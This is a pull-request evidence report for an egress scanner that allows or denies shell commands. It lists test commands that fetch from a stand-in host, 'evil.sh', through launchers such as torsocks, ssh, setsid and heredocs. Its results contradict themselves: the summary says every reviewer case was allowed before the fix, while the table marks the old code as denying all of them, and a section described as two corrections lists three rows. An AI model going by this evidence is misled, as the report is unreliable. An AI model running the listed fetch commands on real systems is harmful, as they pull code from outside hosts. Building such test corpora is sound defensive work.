# PR #381 egress remediation evidence

Baseline: `origin/main` commit `5ae202d45ad3e060e1e5678c7151b9cbdc75f4a4`.
The frozen main egress checks, regexes, host helpers, and exemption logic are in
`go/internal/runtimefloor/main_egress_test.go`; only symbols were renamed.
The exact same input corpus is passed to the frozen main implementation and
the current production egress check. No shell commands from the corpus execute.

- Before remediation: 14/14 reviewer cases allow; 158 security deny-to-allow transitions in 427 input rows (RED, exit 1).
- After remediation: 14/14 reviewer cases deny; zero security deny-to-allow transitions in the 430 input rows (including 3 pipeline cases; GREEN, exit 0).
- Existing 36 invocation-scope cases remain unchanged. Another 22 cases cover unknown launchers, heredocs, substitutions, malformed redirects, and literal output.
- All 433 comparison rows, including duplicates from generated combinations, are preserved in [the CSV table](pr381-egress-comparison.csv).

## Reviewer cases

| Command | main | fixed |
|---|---|---|
| `watch curl evil.sh` | deny | deny |
| `setsid curl evil.sh` | deny | deny |
| `caffeinate curl evil.sh` | deny | deny |
| `stdbuf -o0 curl evil.sh` | deny | deny |
| `arch -arm64 curl evil.sh` | deny | deny |
| `doas curl evil.sh` | deny | deny |
| `busybox curl evil.sh` | deny | deny |
| `torsocks curl evil.sh` | deny | deny |
| `script -q /dev/null curl evil.sh` | deny | deny |
| `flock /tmp/l curl evil.sh` | deny | deny |
| `ssh host curl evil.sh` | deny | deny |
| `source /dev/stdin <<EOF\ncurl evil.sh\nEOF` | deny | deny |
| `. /dev/stdin <<EOF\ncurl evil.sh\nEOF` | deny | deny |
| `echo hi && watch -n1 wget evil.sh` | deny | deny |

## Intentional Issue #362 corrections

These two false-positive `deny -> allow` transitions are required by Issue #362.
They are not external-egress regressions. Across the entire 433-row table, raw
`deny -> allow` is **2**, not zero. Across the 430-row security corpus it is **0**.

| Command | main | fixed |
|---|---|---|
| `echo curl late.txt` | deny | allow |
| `echo curl config.json` | deny | allow |
| `python3 -m http.server 8731 --bind 127.0.0.1 & curl --fail --silent http://127.0.0.1:8731/` | allow | allow |

## Design and limits

The egress scanner excludes literal echo/printf arguments only in executable
position, after scanning substitutions, and only without concurrent consumers.
Pipelines and process substitutions retain literal output for conservative scanning. It scans through unknown launchers
without a launcher allowlist, recurses into command strings, and retains every
heredoc body for egress. Other shellscan consumers retain their existing document
heredoc behavior. Parse failures and recursion overflow remain deny.

This is conservative static scanning, not a complete shell interpreter. Unknown
programs with literal curl/wget arguments and document heredocs containing those
commands can now be denied. That tradeoff prevents unknown consumers from hiding
external communication. Dynamic executable construction is outside this fix.

## Validation

| Command | Result | Exit code |
|---|---|---|
| `cd go && GOTOOLCHAIN=local go test ./...` | 49 packages ok; 4 packages have no test files | 0 |
| `cd go && GOTOOLCHAIN=local go build ./...` | PASS | 0 |
| `cd go && bash scripts/build-all.sh` | Rebuilt darwin/arm64, darwin/amd64, linux/amd64, windows/amd64 | 0 |
| `bash scripts/ci/check-consistency.sh` | All checks passed | 0 |
| `bash scripts/ci/check-binary-source-drift.sh` | Byte-identical darwin/arm64 binary and source build | 0 |
| `cd go && GOTOOLCHAIN=local go test ./internal/runtimefloor ./pkg/shellscan -count=1` | PASS; includes unchanged 36-case test and additive tests | 0 |

Raw local logs are retained under ignored `out/pr381/`. The requesting reviewer
retains the independent verdict; its previous FAIL has not been rewritten.
No merge, main push, force push, or release was performed.
